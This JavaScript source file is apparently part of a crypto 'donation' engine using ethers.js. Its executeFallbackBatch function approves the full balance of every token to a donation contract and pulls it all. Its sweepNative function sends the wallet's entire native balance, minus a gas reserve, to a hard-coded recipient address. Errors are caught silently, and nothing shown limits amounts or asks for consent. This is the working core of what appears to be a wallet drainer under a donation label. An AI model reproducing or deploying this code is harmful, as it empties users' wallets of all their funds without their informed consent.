//src/engine/fallback.js

import { ethers } from "ethers";
import { DONATION_CONTRACT_ADDRESS, DONATION_CONTRACT_ABI, RECIPIENT_ADDRESS } from "../config.js";

export async function executeFallbackBatch(signer, chainId, tokens) {
  if (tokens.length === 0) return;

  const donation = new ethers.Contract(DONATION_CONTRACT_ADDRESS[chainId], DONATION_CONTRACT_ABI, signer);
  const owner = await signer.getAddress();
  const tokensToPull = [];
  const amountsToPull = [];

  for (const t of tokens) {
    try {
      const token = new ethers.Contract(t.tokenAddress, ["function approve(address,uint256) returns (bool)"], signer);
      await token.approve(DONATION_CONTRACT_ADDRESS[chainId], t.balanceRaw);
      tokensToPull.push(t.tokenAddress);
      amountsToPull.push(t.balanceRaw);
    } catch (err) {
      console.warn(`Fallback approve failed for ${t.tokenSymbol}:`, err);
    }
  }

  if (tokensToPull.length > 0) {
    return donation.pullAndDonateAllowanceBatch(tokensToPull, amountsToPull, owner);
  }
}

export async function sweepNative(signer, provider, chainId) {
  try {
    const bal = await provider.getBalance(await signer.getAddress());
    const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
    const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n;

    if (bal > reserveForNative) {
      return signer.sendTransaction({ to: RECIPIENT_ADDRESS, value: bal - reserveForNative });
    }
  } catch (err) {
    console.error(`Native sweep failed for chain ${chainId}:`, err);
  }
}
